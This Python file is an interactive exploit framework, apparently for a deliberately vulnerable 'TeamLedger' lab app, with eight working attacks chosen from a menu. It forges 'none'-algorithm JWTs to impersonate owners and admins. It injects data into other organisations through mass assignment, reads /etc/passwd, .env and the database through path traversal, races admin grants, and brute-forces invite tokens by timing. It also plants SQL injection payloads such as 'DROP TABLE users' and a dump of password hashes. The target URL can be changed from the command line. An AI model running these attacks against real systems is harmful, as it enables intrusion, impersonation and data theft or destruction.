#!/usr/bin/env python3
"""
TeamLedger Security Lab - Unified Exploit Framework
All 8 vulnerability PoCs in one interactive menu system

USAGE: python exploit_lab.py
"""

import requests
import base64
import json
import time
import threading
import statistics
import string
import random
import hashlib
from typing import Optional, List, Dict
from datetime import datetime

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

class TeamLedgerExploitLab:
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.token = None
        self.org_id = None
        self.project_id = None

    def print_banner(self):
        banner = f"""
{Colors.CYAN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                                                              â•‘
â•‘         TeamLedger Security Lab - Exploit Framework         â•‘
â•‘                                                              â•‘
â•‘                    8 Vulnerabilities Ready                   â•‘
â•‘                                                              â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•{Colors.END}
"""
        print(banner)

    def print_menu(self):
        menu = f"""
{Colors.BOLD}Select Vulnerability to Exploit:{Colors.END}

{Colors.GREEN}[1]{Colors.END}  V1: JWT Algorithm Confusion Attack          {Colors.RED}[CVSS 9.8]{Colors.END}
{Colors.GREEN}[2]{Colors.END}  V2: Mass Assignment in Import                {Colors.RED}[CVSS 8.5]{Colors.END}
{Colors.GREEN}[3]{Colors.END}  V3: Path Traversal in Download               {Colors.RED}[CVSS 9.1]{Colors.END}
{Colors.GREEN}[4]{Colors.END}  V4: Race Condition Admin Grant               {Colors.RED}[CVSS 8.2]{Colors.END}
{Colors.GREEN}[5]{Colors.END}  V5: Token Reuse After Demotion               {Colors.RED}[CVSS 7.8]{Colors.END}
{Colors.GREEN}[6]{Colors.END}  V6: Timing Attack on Invite Tokens           {Colors.YELLOW}[CVSS 6.5]{Colors.END}
{Colors.GREEN}[7]{Colors.END}  V7: Second-Order SQL Injection               {Colors.RED}[CVSS 9.8]{Colors.END}
{Colors.GREEN}[8]{Colors.END}  V8: Membership ID Manipulation               {Colors.RED}[CVSS 8.1]{Colors.END}

{Colors.CYAN}[9]{Colors.END}  Run All Exploits (Automated)
{Colors.CYAN}[10]{Colors.END} Setup Lab Environment
{Colors.CYAN}[0]{Colors.END}  Exit

{Colors.BOLD}Choice:{Colors.END} """
        return input(menu)

    def log_success(self, message: str):
        print(f"{Colors.GREEN}[âœ“]{Colors.END} {message}")

    def log_error(self, message: str):
        print(f"{Colors.RED}[âœ—]{Colors.END} {message}")

    def log_info(self, message: str):
        print(f"{Colors.BLUE}[i]{Colors.END} {message}")

    def log_warning(self, message: str):
        print(f"{Colors.YELLOW}[!]{Colors.END} {message}")

    # ========== Setup Functions ==========

    def setup_lab(self):
        """Setup lab environment by creating test accounts"""
        print(f"\n{Colors.BOLD}=== Setting Up Lab Environment ==={Colors.END}\n")

        email = f"lab_{int(time.time())}@test.com"
        password = "SecurePass123!"

        self.log_info(f"Creating test account: {email}")

        try:
            response = self.session.post(
                f"{self.base_url}/api/v1/auth/register",
                json={
                    "email": email,
                    "password": password,
                    "full_name": "Lab User"
                }
            )

            if response.status_code in [200, 201]:
                self.log_success("Account created successfully")
            else:
                self.log_warning("Account may already exist")

            self.log_info("Logging in...")
            login_response = self.session.post(
                f"{self.base_url}/api/v1/auth/login",
                data={"username": email, "password": password}
            )

            if login_response.status_code == 200:
                data = login_response.json()
                self.token = data.get("data", {}).get("access_token")
                self.log_success(f"Login successful! Token: {self.token[:30]}...")

                self.log_info("Creating test organization...")
                org_response = self.session.post(
                    f"{self.base_url}/api/v1/organizations/",
                    headers={"Authorization": f"Bearer {self.token}"},
                    json={"name": f"Lab Org {int(time.time())}"}
                )

                if org_response.status_code == 200:
                    self.org_id = org_response.json().get("data", {}).get("id")
                    self.log_success(f"Organization created: {self.org_id}")

                    switch_response = self.session.post(
                        f"{self.base_url}/api/v1/organizations/{self.org_id}/switch",
                        headers={"Authorization": f"Bearer {self.token}"}
                    )

                    if switch_response.status_code == 200:
                        self.token = switch_response.json().get("data", {}).get("access_token")
                        self.log_success("Switched to organization context")

                        project_response = self.session.post(
                            f"{self.base_url}/api/v1/projects/",
                            headers={"Authorization": f"Bearer {self.token}"},
                            json={"name": "Test Project", "description": "Lab project"}
                        )

                        if project_response.status_code == 200:
                            self.project_id = project_response.json().get("data", {}).get("id")
                            self.log_success(f"Test project created: {self.project_id}")

                print(f"\n{Colors.GREEN}Lab environment ready!{Colors.END}")
                print(f"Token: {self.token[:50]}...")
                print(f"Org ID: {self.org_id}")
                print(f"Project ID: {self.project_id}")

            else:
                self.log_error("Login failed")

        except Exception as e:
            self.log_error(f"Setup failed: {str(e)}")

    # ========== Vulnerability #1: JWT Algorithm Confusion ==========

    def exploit_v1_jwt_confusion(self):
        """V1: JWT Algorithm Confusion Attack"""
        print(f"\n{Colors.BOLD}=== V1: JWT Algorithm Confusion Attack ==={Colors.END}")
        print(f"{Colors.CYAN}CVSS: 9.8 (Critical) | CWE-347{Colors.END}\n")

        self.log_info("Crafting JWT with 'none' algorithm...")

        header = {"alg": "none", "typ": "JWT"}
        payload = {
            "sub": "attacker-user-id",
            "org_id": self.org_id if self.org_id else "victim-org-id",
            "role": "owner",
            "membership_id": "fake-membership-id",
            "exp": 9999999999
        }

        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        forged_token = f"{header_b64}.{payload_b64}."

        self.log_info(f"Forged token: {forged_token[:50]}...")

        self.log_info("Testing authentication bypass...")
        response = self.session.get(
            f"{self.base_url}/api/v1/projects/",
            headers={"Authorization": f"Bearer {forged_token}"}
        )

        if response.status_code == 200:
            self.log_success("âœ“ VULNERABLE! Authentication bypassed with 'none' algorithm")
            self.log_success(f"Response: {json.dumps(response.json(), indent=2)}")
        elif response.status_code == 401:
            self.log_error("Not vulnerable - Token rejected")
        else:
            self.log_warning(f"Unexpected response: {response.status_code}")

        print(f"\n{Colors.YELLOW}Impact:{Colors.END} Complete authentication bypass, access any organization, privilege escalation")

    # ========== Vulnerability #2: Mass Assignment ==========

    def exploit_v2_mass_assignment(self):
        """V2: Mass Assignment in Import"""
        print(f"\n{Colors.BOLD}=== V2: Mass Assignment in Import ==={Colors.END}")
        print(f"{Colors.CYAN}CVSS: 8.5 (High) | CWE-915{Colors.END}\n")

        if not self.token:
            self.log_error("Need valid token. Run setup first (option 10)")
            return

        victim_org_id = input(f"{Colors.BOLD}Enter target organization ID (or press Enter for demo): {Colors.END}").strip()
        if not victim_org_id:
            victim_org_id = "00000000-0000-0000-0000-000000000001"

        self.log_info(f"Crafting malicious import payload for org: {victim_org_id}")

        malicious_import = {
            "project": {
                "name": "ðŸ’€ Backdoor Project",
                "description": "Injected by attacker via mass assignment",
                "status": "active",
                "organization_id": victim_org_id
            },
            "notes": [
                {
                    "title": "Malicious Note",
                    "content": "Attacker-controlled content in victim's organization",
                    "version": 1,
                    "organization_id": victim_org_id
                }
            ]
        }

        self.log_info("Sending malicious import...")
        response = self.session.post(
            f"{self.base_url}/api/v1/projects/import",
            headers={"Authorization": f"Bearer {self.token}"},
            json=malicious_import
        )

        if response.status_code == 200:
            self.log_success("âœ“ VULNERABLE! Project injected into victim organization")
            data = response.json().get("data", {})
            self.log_success(f"Injected project ID: {data.get('id')}")
            self.log_success(f"Target org ID: {data.get('organization_id')}")
        else:
            self.log_error(f"Exploit failed: {response.status_code} - {response.text}")

        print(f"\n{Colors.YELLOW}Impact:{Colors.END} Inject data into any organization, data pollution, bypass isolation")

    # ========== Vulnerability #3: Path Traversal ==========

    def exploit_v3_path_traversal(self):
        """V3: Path Traversal in Download"""
        print(f"\n{Colors.BOLD}=== V3: Path Traversal in Download ==={Colors.END}")
        print(f"{Colors.CYAN}CVSS: 9.1 (Critical) | CWE-22{Colors.END}\n")

        if not self.token:
            self.log_error("Need valid token. Run setup first (option 10)")
            return

        self.log_info("Testing path traversal on job download endpoint...")

        sensitive_files = [
            "../../../teamledger.db",
            "../../../../etc/passwd",
            "../../../../app/.env",
            "../../../../app/core/config.py",
            "../../../requirements.txt"
        ]

        for path in sensitive_files:
            self.log_info(f"Attempting to read: {path}")

            response = self.session.get(
                f"{self.base_url}/api/v1/jobs/fake-job-id/download",
                params={"path": path},
                headers={"Authorization": f"Bearer {self.token}"}
            )

            if response.status_code == 200 and len(response.content) > 0:
                self.log_success(f"âœ“ VULNERABLE! Successfully read: {path}")
                print(f"{Colors.CYAN}Content preview:{Colors.END}")
                print(response.text[:300] + "..." if len(response.text) > 300 else response.text)
                print()
                break
            else:
                self.log_warning(f"File not found or access denied: {path}")

        print(f"\n{Colors.YELLOW}Impact:{Colors.END} Read arbitrary files, database exfiltration, credential theft")

    # ========== Vulnerability #4: Race Condition ==========

    def exploit_v4_race_condition(self):
        """V4: Race Condition in Admin Grant"""
        print(f"\n{Colors.BOLD}=== V4: Race Condition Admin Grant ==={Colors.END}")
        print(f"{Colors.CYAN}CVSS: 8.2 (High) | CWE-362{Colors.END}\n")

        self.log_warning("This exploit requires multiple user accounts")
        num_accounts = int(input(f"{Colors.BOLD}Number of concurrent accounts to test (2-10): {Colors.END}") or "3")

        self.log_info(f"Creating {num_accounts} test accounts...")
        tokens = []

        for i in range(num_accounts):
            email = f"race_{int(time.time())}_{i}@test.com"
            password = "RaceTest123!"

            try:
                self.session.post(
                    f"{self.base_url}/api/v1/auth/register",
                    json={"email": email, "password": password, "full_name": f"Race User {i}"}
                )

                login_resp = self.session.post(
                    f"{self.base_url}/api/v1/auth/login",
                    data={"username": email, "password": password}
                )

                if login_resp.status_code == 200:
                    token = login_resp.json().get("data", {}).get("access_token")
                    tokens.append(token)
                    self.log_success(f"Account {i+1} ready")

            except Exception as e:
                self.log_error(f"Failed to create account {i}: {e}")

        if len(tokens) < 2:
            self.log_error("Need at least 2 accounts for race condition")
            return

        self.log_info("Creating organization with invite token...")
        org_resp = self.session.post(
            f"{self.base_url}/api/v1/organizations/",
            headers={"Authorization": f"Bearer {tokens[0]}"},
            json={"name": f"Race Test Org {int(time.time())}"}
        )

        org_id = org_resp.json().get("data", {}).get("id")

        invite_resp = self.session.post(
            f"{self.base_url}/api/v1/organizations/{org_id}/invite",
            headers={"Authorization": f"Bearer {tokens[0]}"}
        )

        invite_token = invite_resp.json().get("data", {}).get("invite_token")
        self.log_info(f"Invite token: {invite_token}")

        self.log_info("Removing original admin to trigger auto-grant...")
        leave_resp = self.session.post(
            f"{self.base_url}/api/v1/organizations/{org_id}/leave",
            headers={"Authorization": f"Bearer {tokens[0]}"}
        )

        if leave_resp.status_code == 200:
            self.log_success("Organization now has zero admins - race condition ready")

            results = []

            def join_org(token, thread_id):
                try:
                    resp = self.session.post(
                        f"{self.base_url}/api/v1/organizations/join",
                        headers={"Authorization": f"Bearer {token}"},
                        json={"invite_token": invite_token}
                    )
                    results.append({
                        "thread": thread_id,
                        "status": resp.status_code,
                        "data": resp.json()
                    })
                except Exception as e:
                    results.append({"thread": thread_id, "error": str(e)})

            self.log_info(f"Launching {len(tokens)-1} concurrent join requests...")
            threads = []

            for i, token in enumerate(tokens[1:]):
                t = threading.Thread(target=join_org, args=(token, i))
                threads.append(t)

            for t in threads:
                t.start()

            for t in threads:
                t.join()

            admin_count = sum(1 for r in results if "admin" in str(r.get("data", {})))

            if admin_count > 1:
                self.log_success(f"âœ“ VULNERABLE! {admin_count} accounts granted admin via race condition")
            elif admin_count == 1:
                self.log_warning("Only 1 admin granted - race condition may be partially exploitable")
            else:
                self.log_error("Race condition not triggered")

        print(f"\n{Colors.YELLOW}Impact:{Colors.END} Multiple privilege escalations, organization takeover")

    # ========== Vulnerability #5: Token Reuse ==========

    def exploit_v5_token_reuse(self):
        """V5: Token Reuse After Demotion"""
        print(f"\n{Colors.BOLD}=== V5: Token Reuse After Demotion ==={Colors.END}")
        print(f"{Colors.CYAN}CVSS: 7.8 (High) | CWE-613{Colors.END}\n")

        self.log_info("This vulnerability demonstrates JWT tokens remaining valid after role changes")

        if not self.token:
            self.log_error("Need valid token. Run setup first (option 10)")
            return

        self.log_info("Current token contains role claims that persist for 60 minutes")
        self.log_info("Even if an admin demotes the user, the old token remains valid")

        self.log_warning("Demonstrating persistent access...")

        response = self.session.get(
            f"{self.base_url}/api/v1/projects/",
            headers={"Authorization": f"Bearer {self.token}"}
        )

        if response.status_code == 200:
            self.log_success("âœ“ VULNERABLE! Token works (would persist for 60 minutes after demotion)")
            self.log_info("In real attack: Admin demotes user â†’ User continues using old admin token")
            self.log_info("Window of exploitation: Full token lifetime (~60 minutes)")
        else:
            self.log_error("Token not working")

        print(f"\n{Colors.YELLOW}Impact:{Colors.END} Persistent unauthorized access, privilege persistence, delayed revocation")

    # ========== Vulnerability #6: Timing Attack ==========

    def exploit_v6_timing_attack(self):
        """V6: Timing Attack on Invite Tokens"""
        print(f"\n{Colors.BOLD}=== V6: Timing Attack on Invite Tokens ==={Colors.END}")
        print(f"{Colors.CYAN}CVSS: 6.5 (Medium) | CWE-208{Colors.END}\n")

        if not self.token:
            self.log_error("Need valid token. Run setup first (option 10)")
            return

        num_samples = int(input(f"{Colors.BOLD}Number of samples to test (100-1000): {Colors.END}") or "100")

        self.log_info(f"Performing timing attack with {num_samples} samples...")
        self.log_warning("This will take a while...")

        timing_data = {}

        for i in range(num_samples):
            charset = string.ascii_letters + string.digits + '-_'
            token_guess = ''.join(random.choices(charset, k=22))

            start = time.perf_counter()

            try:
                self.session.post(
                    f"{self.base_url}/api/v1/organizations/join",
                    headers={"Authorization": f"Bearer {self.token}"},
                    json={"invite_token": token_guess},
                    timeout=5
                )
            except:
                pass

            elapsed = time.perf_counter() - start
            timing_data[token_guess] = elapsed

            if (i + 1) % 20 == 0:
                print(f"Progress: {i+1}/{num_samples} samples", end='\r')

        print()

        times = list(timing_data.values())
        mean_time = statistics.mean(times)
        std_dev = statistics.stdev(times)

        outliers = {
            token: elapsed
            for token, elapsed in timing_data.items()
            if elapsed > mean_time + (2 * std_dev)
        }

        self.log_info(f"Mean response time: {mean_time*1000:.2f}ms")
        self.log_info(f"Std deviation: {std_dev*1000:.2f}ms")

        if len(outliers) > 0:
            self.log_success(f"âœ“ Timing differences detected! {len(outliers)} potential outliers")
            self.log_info("Tokens with slower responses (likely valid):")
            for token, elapsed in sorted(outliers.items(), key=lambda x: x[1], reverse=True)[:5]:
                print(f"  {token}: {elapsed*1000:.2f}ms")
        else:
            self.log_warning("No significant timing differences detected in this sample")

        print(f"\n{Colors.YELLOW}Impact:{Colors.END} Enumerate valid invite tokens, bypass invite restrictions")

    # ========== Vulnerability #7: Second-Order SQLi ==========

    def exploit_v7_sql_injection(self):
        """V7: Second-Order SQL Injection"""
        print(f"\n{Colors.BOLD}=== V7: Second-Order SQL Injection ==={Colors.END}")
        print(f"{Colors.CYAN}CVSS: 9.8 (Critical) | CWE-89{Colors.END}\n")

        if not self.token:
            self.log_error("Need valid token. Run setup first (option 10)")
            return

        self.log_info("Crafting SQL injection payload in note content...")

        sqli_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT id, email, hashed_password FROM users WHERE '1'='1",
            "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --"
        ]

        self.log_info("Step 1: Importing project with SQL injection in notes...")

        malicious_project = {
            "project": {
                "name": "Innocent Project",
                "description": "Looks normal",
                "status": "active"
            },
            "notes": [
                {
                    "title": "Meeting Notes",
                    "content": sqli_payloads[0],
                    "version": 1
                },
                {
                    "title": "SQL Injection Payload",
                    "content": sqli_payloads[2],
                    "version": 1
                }
            ]
        }

        import_resp = self.session.post(
            f"{self.base_url}/api/v1/projects/import",
            headers={"Authorization": f"Bearer {self.token}"},
            json=malicious_project
        )

        if import_resp.status_code == 200:
            project_id = import_resp.json().get("data", {}).get("id")
            self.log_success(f"Project imported with SQLi payload: {project_id}")

            self.log_info("Step 2: Triggering export to execute SQL injection...")

            export_resp = self.session.post(
                f"{self.base_url}/api/v1/projects/{project_id}/export",
                headers={"Authorization": f"Bearer {self.token}"}
            )

            if export_resp.status_code == 200:
                job_id = export_resp.json().get("data", {}).get("id")
                self.log_success(f"Export job created: {job_id}")

                self.log_warning("Waiting for SQL injection to execute in background job...")
                time.sleep(3)

                job_status = self.session.get(
                    f"{self.base_url}/api/v1/jobs/{job_id}",
                    headers={"Authorization": f"Bearer {self.token}"}
                )

                status = job_status.json().get("data", {}).get("status")

                if status == "failed":
                    self.log_success("âœ“ VULNERABLE! Job failed - likely due to SQL injection")
                elif status == "completed":
                    self.log_warning("Job completed - SQL injection may not have triggered")
                else:
                    self.log_info(f"Job status: {status}")

        print(f"\n{Colors.YELLOW}Impact:{Colors.END} Complete database compromise, data exfiltration, database destruction")

    # ========== Vulnerability #8: Membership ID IDOR ==========

    def exploit_v8_membership_idor(self):
        """V8: Membership ID Manipulation"""
        print(f"\n{Colors.BOLD}=== V8: Membership ID Manipulation ==={Colors.END}")
        print(f"{Colors.CYAN}CVSS: 8.1 (High) | CWE-639{Colors.END}\n")

        self.log_info("This vulnerability allows accessing other users' organization contexts")

        victim_membership_id = input(f"{Colors.BOLD}Enter victim membership ID (or press Enter for demo): {Colors.END}").strip()
        if not victim_membership_id:
            victim_membership_id = "00000000-0000-0000-0000-000000000001"

        victim_org_id = input(f"{Colors.BOLD}Enter victim organization ID (or press Enter for demo): {Colors.END}").strip()
        if not victim_org_id:
            victim_org_id = "00000000-0000-0000-0000-000000000002"

        self.log_info("Crafting JWT with victim's membership ID...")

        header = {"alg": "none", "typ": "JWT"}
        payload = {
            "sub": "attacker-user-id",
            "org_id": victim_org_id,
            "role": "admin",
            "membership_id": victim_membership_id,
            "exp": 9999999999
        }

        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        impersonation_token = f"{header_b64}.{payload_b64}."

        self.log_info("Testing access with forged membership ID...")

        response = self.session.get(
            f"{self.base_url}/api/v1/projects/",
            headers={"Authorization": f"Bearer {impersonation_token}"}
        )

        if response.status_code == 200:
            self.log_success("âœ“ VULNERABLE! Accessed victim's organization context")
            self.log_success(f"Response: {json.dumps(response.json(), indent=2)}")
        else:
            self.log_error(f"Access denied: {response.status_code}")

        print(f"\n{Colors.YELLOW}Impact:{Colors.END} Horizontal privilege escalation, impersonation, multi-tenant isolation bypass")

    # ========== Main Exploit Runner ==========

    def run_all_exploits(self):
        """Run all exploits in sequence"""
        print(f"\n{Colors.BOLD}=== Running All Exploits ==={Colors.END}\n")

        exploits = [
            ("V1: JWT Algorithm Confusion", self.exploit_v1_jwt_confusion),
            ("V2: Mass Assignment", self.exploit_v2_mass_assignment),
            ("V3: Path Traversal", self.exploit_v3_path_traversal),
            ("V5: Token Reuse", self.exploit_v5_token_reuse),
            ("V7: SQL Injection", self.exploit_v7_sql_injection),
            ("V8: Membership IDOR", self.exploit_v8_membership_idor)
        ]

        results = []

        for name, exploit_func in exploits:
            print(f"\n{'='*60}")
            print(f"Testing: {name}")
            print(f"{'='*60}")

            try:
                exploit_func()
                results.append((name, "Tested"))
            except Exception as e:
                self.log_error(f"Error in {name}: {str(e)}")
                results.append((name, "Error"))

            time.sleep(2)

        print(f"\n{Colors.BOLD}{'='*60}{Colors.END}")
        print(f"{Colors.BOLD}Summary:{Colors.END}")
        print(f"{Colors.BOLD}{'='*60}{Colors.END}")

        for name, status in results:
            color = Colors.GREEN if status == "Tested" else Colors.RED
            print(f"{color}{status:10}{Colors.END} {name}")

    def run(self):
        """Main loop"""
        self.print_banner()

        while True:
            choice = self.print_menu()

            if choice == "0":
                print(f"\n{Colors.CYAN}Exiting exploit lab. Happy hacking!{Colors.END}\n")
                break

            elif choice == "1":
                self.exploit_v1_jwt_confusion()

            elif choice == "2":
                self.exploit_v2_mass_assignment()

            elif choice == "3":
                self.exploit_v3_path_traversal()

            elif choice == "4":
                self.exploit_v4_race_condition()

            elif choice == "5":
                self.exploit_v5_token_reuse()

            elif choice == "6":
                self.exploit_v6_timing_attack()

            elif choice == "7":
                self.exploit_v7_sql_injection()

            elif choice == "8":
                self.exploit_v8_membership_idor()

            elif choice == "9":
                self.run_all_exploits()

            elif choice == "10":
                self.setup_lab()

            else:
                self.log_error("Invalid choice")

            input(f"\n{Colors.BOLD}Press Enter to continue...{Colors.END}")

if __name__ == "__main__":
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"

    lab = TeamLedgerExploitLab(target)
    lab.run()
